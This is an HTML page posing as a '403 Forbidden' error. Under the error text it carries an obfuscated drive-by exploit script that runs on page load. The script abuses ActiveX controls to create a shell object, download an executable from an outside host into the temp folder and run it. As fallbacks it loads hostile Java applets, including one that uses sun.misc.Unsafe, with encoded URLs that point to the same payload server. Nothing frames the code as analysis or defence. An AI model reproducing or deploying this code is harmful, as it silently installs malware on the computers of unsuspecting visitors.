<html>
<head>
<title>403 Forbidden</title>
<style>
* {CURSOR: url("anr/us10417.anr")}
</style>
</head>
<body>
<div id="xpvf"></div>
<script language="JavaScript">
document.write(unescape("%3c%61%70%70%6c%65%74%20%63%6f%64%65%3d%61%6e%69%6d%61%6e%2e%63%6c%61%73%73%20%6e%61%6d%65%3d%6d%61%6e%69%6d%61%6e%20%68%65%69%67%68%74%3d%31%20%77%69%64%74%68%3d%31%20%4d%41%59%53%43%52%49%50%54%3e%3c%2f%61%70%70%6c%65%74%3e"));

function pass1CreateO(o, n)
{
    var r = null;
    try { eval('r = o.CreateObject(n)') } catch(e){}
    if (!r) {try { eval('r = o.CreateObject(n, "")') } catch(e){}}
    if (!r) {try { eval('r = o.CreateObject(n, "", "")') } catch(e){}}
    if (!r) {try { eval('r = o.GetObject("", n)') } catch(e){}}
    if (!r) {try { eval('r = o.GetObject(n, "")') } catch(e){}}
    if (!r) {try { eval('r = o.GetObject(n)') } catch(e){}}
    return(r);
}

function pass1Go(a, ii, uu)
{
    var s = pass1CreateO(a, "WS"+"crip"+"t.She"+"ll");
    var o = pass1CreateO(a, "AD"+"ODB.S"+"tream");
    var e = s.Environment("Pro"+"cess");
    var xml = null;
    var bin = e.Item("TE"+"MP") + ii + "10417.e"+"xe";
    var dat;
    try
    {
	xml = new XMLHttpRequest();
    } catch(e) {
	try
	{
	    xml = new ActiveXObject("Mic"+"rosof"+"t.XM"+"LHT"+"TP");
	} catch(e) {
	    xml = new ActiveXObject("MSX"+"ML2.S"+"erve"+"rXMLH"+"TTP");
	}
    }
    if (!xml) return(0);
    xml.open("G"+"ET", uu, false);
    xml.send(null);
    dat = xml.responseBody;
    o.Type = 1;
    o.Mode = 3;
    o.Open();
    o.Write(dat);
    o.SaveToFile(bin, 2);
    s.Run(bin,0);
}

function pass1(ii, uu)
{
    var i = 0;
    var t = new Array('{BD96C556-65A3-11D0-983A-00C04FC29E36}','{BD96C556-65A3-11D0-983A-00C04FC29E30}','{AB9BCEDD-EC7E-47E1-9322-D4A210617116}','{0006F033-0000-0000-C000-000000000046}','{0006F03A-0000-0000-C000-000000000046}','{6e32070a-766d-4ee6-879c-dc1fa91d2fc3}','{6414512B-B978-451D-A0D8-FCFDF33E833C}','{7F5B7F63-F06F-4331-8A26-339E03C0AE3D}','{06723E09-F4C2-43c8-8358-09FCD1DB0766}','{639F725F-1B2D-4831-A9FD-874847682010}','{BA018599-1DB3-44f9-83B4-461454C84BF8}','{D0C07D56-7C69-43F1-B4A0-25F5A11FAB19}','{E8CCCDDF-CA28-496b-B050-6C07C962476B}',null);
    while (t[i]) {
	var a = null;
	if (t[i].substring(0,1) == '{') {
	    a = document.createElement("object");
	    a.setAttribute("classid", "clsid:" + t[i].substring(1, t[i].length - 1));
	} else {
	    try { a = new ActiveXObject(t[i]); } catch(e){}
	}
	if (a) {
	    try
	    {
		var b = pass1CreateO(a, "WScr"+"ipt.S"+"hell");
		if (b) {
		    pass1Go(a, ii, uu);
		    return 1;
		}
	    } catch(e){}
	}
	i++;
    }
    return -1;
}

function pass2()
{
    try {
	var unsafeclass = document.maniman.getClass().forName("sun.misc.Unsafe");
	var unsafemeth = unsafeclass.getMethod("getUnsafe", null);
	var unsafe = unsafemeth.invoke(unsafemeth, null);
	document.maniman.foobar(unsafe);
	var chenref = unsafe.defineClass("omfg", document.maniman.luokka, 0, document.maniman.classSize);
	var chen = unsafe.allocateInstance(chenref);
	chen.setURLdl(unescape("%68%74%74%70%3a%2f%2f%6c%6e%74%6f%70%2e%69%6e%66%6f%2f%6c%33%2f"));
	chen.setUname("10417");
	chen.setCID("other");
	chen.setSoft("eGxvYWRlcjEwNDE3LmV4ZQ==");
	chen.perse(unsafe);
    } catch (d) {return -1;}
    return 1;
}

function pass3()
{
    document.write(unescape("%3c%61%70%70%6c%65%74%20%61%72%63%68%69%76%65%3d%4a%61%76%61%32%53%45%2e%6a%61%72%20%63%6f%64%65%3d%4a%61%76%61%32%53%45%2e%63%6c%61%73%73%20%77%69%64%74%68%3d%31%20%68%65%69%67%68%74%3d%31%20%4d%41%59%53%43%52%49%50%54%3e%3c%70%61%72%61%6d%20%6e%61%6d%65%3d%75%73%69%64%20%76%61%6c%75%65%3d%75%73%31%30%34%31%37%3e%3c%70%61%72%61%6d%20%6e%61%6d%65%3d%6c%31%20%76%61%6c%75%65%3d%68%74%74%70%3a%2f%2f%6c%6e%74%6f%70%2e%69%6e%66%6f%2f%6c%33%2f%67%66%2e%70%68%70%3f%69%64%3d%31%30%34%31%37%3e%3c%70%61%72%61%6d%20%6e%61%6d%65%3d%6c%32%20%76%61%6c%75%65%3d%68%74%74%70%3a%2f%2f%6c%6e%74%6f%70%2e%69%6e%66%6f%2f%6c%33%2f%3f%69%64%3d%31%30%34%31%37%26%74%3d%6f%74%68%65%72%26%6f%3d%34%26%73%3d%65%47%78%76%59%57%52%6c%63%6a%45%77%4e%44%45%33%4c%6d%56%34%5a%51%3d%3d%3e%3c%2f%61%70%70%6c%65%74%3e"));
    document.write(unescape("%3c%41%50%50%4c%45%54%20%41%52%43%48%49%56%45%3d%64%73%62%72%2e%6a%61%72%20%63%6f%64%65%3d%4d%61%67%69%63%41%70%70%6c%65%74%2e%63%6c%61%73%73%20%57%49%44%54%48%3d%31%20%48%45%49%47%48%54%3d%31%20%6e%61%6d%65%3d%64%73%62%72%20%4d%41%59%53%43%52%49%50%54%3e"));
    document.write(unescape("%3c%70%61%72%61%6d%20%6e%61%6d%65%3d%4d%6f%64%75%6c%65%50%61%74%68%20%76%61%6c%75%65%3d%68%74%74%70%3a%2f%2f%6c%6e%74%6f%70%2e%69%6e%66%6f%2f%6c%33%2f%3f%69%64%3d%31%30%34%31%37%26%74%3d%6f%74%68%65%72%26%6f%3d%32%26%73%3d%65%47%78%76%59%57%52%6c%63%6a%45%77%4e%44%45%33%4c%6d%56%34%5a%51%3d%3d%3e%3c%2f%41%50%50%4c%45%54%3e"));
    return 1;
}
if (pass1('lx', unescape("%68%74%74%70%3a%2f%2f%6c%6e%74%6f%70%2e%69%6e%66%6f%2f%6c%33%2f%3f%69%64%3d%31%30%34%31%37%26%74%3d%6f%74%68%65%72%26%6f%3d%30%26%73%3d%65%47%78%76%59%57%52%6c%63%6a%45%77%4e%44%45%33%4c%6d%56%34%5a%51%3d%3d")) != 1) {
    if (pass2() != 1) {
	pass3();
	// here
    }
}
</script>
<h1>Forbidden</h1><p>You don't have permissions.</p><hr>
</body>
</html>
